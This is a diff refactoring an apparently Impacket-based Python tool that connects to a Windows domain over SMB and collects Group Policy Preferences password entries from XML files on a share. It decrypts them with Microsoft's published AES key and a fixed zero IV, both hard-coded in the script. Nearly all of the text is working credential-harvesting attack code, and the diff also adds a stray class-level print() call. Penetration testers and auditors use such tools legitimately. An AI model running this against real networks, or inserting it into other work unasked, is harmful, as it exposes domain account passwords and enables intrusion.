@@ -1,13 +1,11 @@
-#!/usr/bin/env python3
-# todo : licence
-# Description: todo
+# !/usr/bin/env python3
 #
-# Author:
+# Description: Python script for extracting and decrypting Group Policy Preferences passwords,
+# using Impacket's lib, and using streams for carving files instead of mounting shares
+#
+# Authors:
 #  Remi Gascou (@podalirius_)
 #  Charlie Bromberg (@_nwodtuhs)
-#
-# Reference for:
-#  SMB DCE/RPC
 
 import argparse
 import logging
@@ -25,9 +23,7 @@ from Crypto.Util.Padding import unpad
 
 from impacket import version
 from impacket.examples import logger
-from impacket.smbconnection import SMBConnection, SMB2_DIALECT_002, SMB2_DIALECT_21, SMB_DIALECT, SessionError, \
-    FILE_READ_DATA, FILE_SHARE_READ, FILE_SHARE_WRITE
-from impacket.smb3structs import FILE_DIRECTORY_FILE, FILE_LIST_DIRECTORY
+from impacket.smbconnection import SMBConnection, SMB2_DIALECT_002, SMB2_DIALECT_21, SMB_DIALECT, SessionError
 
 
 class GetGPPasswords(object):
@@ -49,10 +45,8 @@ class GetGPPasswords(object):
 
     def find_files(self, base_dir, extension='xml'):
         logging.info("Searching *.%s files..." % extension)
-        # Breadth-first search algorithm
+        # Breadth-first search algorithm to recursively find .extension files
         files = []
-        #searchdirs = ['/']
-        # todo : fix this + '/'
         searchdirs = [base_dir + '/']
         while len(searchdirs) != 0:
             next_dirs = []
@@ -74,8 +68,9 @@ class GetGPPasswords(object):
         logging.debug('Found %d %s files' % (len(files), extension))
         logging.debug('Printing matching files...')
         for f in files:
-            logging.debug(f)
+            logging.debug('  - %s' % f)
         return files
+    print()
 
     def parse(self, files=[]):
         results = []
@@ -83,6 +78,8 @@ class GetGPPasswords(object):
             filename = filename.replace('/', '\\')
             fh = BytesIO()
             try:
+                # opening the files in streams instead of mounting shares allows for running the script from
+                # unprivileged containers
                 self.smb.getFile(self.share, filename, fh.write)
             except SessionError as e:
                 logging.error(e)
@@ -91,12 +88,12 @@ class GetGPPasswords(object):
                 raise
             output = fh.getvalue()
             encoding = chardet.detect(output)["encoding"]
-            error_msg = "[-] Output cannot be correctly decoded, are you sure the text is readable ?"
             if encoding != None:
                 filecontent = output.decode(encoding)
                 logging.debug(filecontent)
                 root = minidom.parseString(filecontent)
                 properties_list = root.getElementsByTagName("Properties")
+                # function to get attribute if it exists, returns "" if empty
                 read_or_empty = lambda element, attribute: (
                     element.getAttribute(attribute) if element.getAttribute(attribute) != None else "")
                 for properties in properties_list:
@@ -110,13 +107,16 @@ class GetGPPasswords(object):
                     })
                 fh.close()
             else:
-                print(error_msg)
+                logging.error("Output cannot be correctly decoded, are you sure the text is readable ?")
                 fh.close()
+        print()
         return results
 
     def decrypt_password(self, pw_enc_b64):
+        # thank you MS for publishing the key :) (https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-gppref/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be)
         key = b'\x4e\x99\x06\xe8\xfc\xb6\x6c\xc9\xfa\xf4\x93\x10\x62\x0f\xfe\xe8\xf4\x96\xe8\x06\xcc\x05\x79\x90\x20' \
               b'\x9b\x09\xa4\x33\xb6\x6c\x1b'
+        # thank you MS for using a fixed IV :)
         iv = b'\x00' * 16
         pad = len(pw_enc_b64) % 4
         if pad == 1:
@@ -129,7 +129,6 @@ class GetGPPasswords(object):
         return pw_dec.decode('utf-16-le')
 
     def show(self, results):
-        print()
         for result in results:
             logging.info(f"NewName\t: {result['newname']}")
             logging.info(f"Changed\t: {result['changed']}")
@@ -175,21 +174,7 @@ def parse_args():
     return parser.parse_args()
 
 
-if __name__ == '__main__':
-    print(version.BANNER)
-    args = parse_args()
-
-    # Init the example's logger theme
-    logger.init(args.ts)
-
-    if args.debug is True:
-        logging.getLogger().setLevel(logging.DEBUG)
-        # Print the Library's installation path
-        logging.debug(version.getInstallationPath())
-    else:
-        logging.getLogger().setLevel(logging.INFO)
-        logging.getLogger('impacket.smbserver').setLevel(logging.ERROR)
-
+def parse_target(args):
     domain, username, password, address = re.compile('(?:(?:([^/@:]*)/)?([^@:]*)(?::([^@]*))?@)?(.*)').match(
         args.target).groups('')
 
@@ -218,33 +203,60 @@ if __name__ == '__main__':
         lmhash = ''
         nthash = ''
 
-    try:
-        smbClient = SMBConnection(address, args.target_ip, sess_port=int(args.port))
-        dialect = smbClient.getDialect()
-        if dialect == SMB_DIALECT:
-            logging.debug("SMBv1 dialect used")
-        elif dialect == SMB2_DIALECT_002:
-            logging.debug("SMBv2.0 dialect used")
-        elif dialect == SMB2_DIALECT_21:
-            logging.debug("SMBv2.1 dialect used")
-        else:
-            logging.debug("SMBv3.0 dialect used")
-        if args.k is True:
-            smbClient.kerberosLogin(username, password, domain, lmhash, nthash, args.aesKey, args.dc_ip)
-        else:
-            smbClient.login(username, password, domain, lmhash, nthash)
-        if smbClient.isGuestSession() > 0:
-            logging.debug("GUEST Session Granted")
-        else:
-            logging.debug("USER Session Granted")
+    return domain, username, password, address, lmhash, nthash
 
+
+def init_logger(args):
+    # Init the example's logger theme and debug level
+    logger.init(args.ts)
+    if args.debug is True:
+        logging.getLogger().setLevel(logging.DEBUG)
+        # Print the Library's installation path
+        logging.debug(version.getInstallationPath())
+    else:
+        logging.getLogger().setLevel(logging.INFO)
+        logging.getLogger('impacket.smbserver').setLevel(logging.ERROR)
+
+
+def init_smb_session(args, domain, username, password, address, lmhash, nthash):
+    smbClient = SMBConnection(address, args.target_ip, sess_port=int(args.port))
+    dialect = smbClient.getDialect()
+    if dialect == SMB_DIALECT:
+        logging.debug("SMBv1 dialect used")
+    elif dialect == SMB2_DIALECT_002:
+        logging.debug("SMBv2.0 dialect used")
+    elif dialect == SMB2_DIALECT_21:
+        logging.debug("SMBv2.1 dialect used")
+    else:
+        logging.debug("SMBv3.0 dialect used")
+    if args.k is True:
+        smbClient.kerberosLogin(username, password, domain, lmhash, nthash, args.aesKey, args.dc_ip)
+    else:
+        smbClient.login(username, password, domain, lmhash, nthash)
+    if smbClient.isGuestSession() > 0:
+        logging.debug("GUEST Session Granted")
+    else:
+        logging.debug("USER Session Granted")
+    return smbClient
+
+
+def main():
+    print(version.BANNER)
+    args = parse_args()
+    init_logger(args)
+    domain, username, password, address, lmhash, nthash = parse_target(args)
+    try:
+        smbClient= init_smb_session(args, domain, username, password, address, lmhash, nthash)
         g = GetGPPasswords(smbClient, args.share)
         g.list_shares()
         files = g.find_files(args.base_dir)
         results = g.parse(files)
         g.show(results)
-
     except Exception as e:
         if logging.getLogger().level == logging.DEBUG:
             traceback.print_exc()
         logging.error(str(e))
+
+
+if __name__ == '__main__':
+    main()
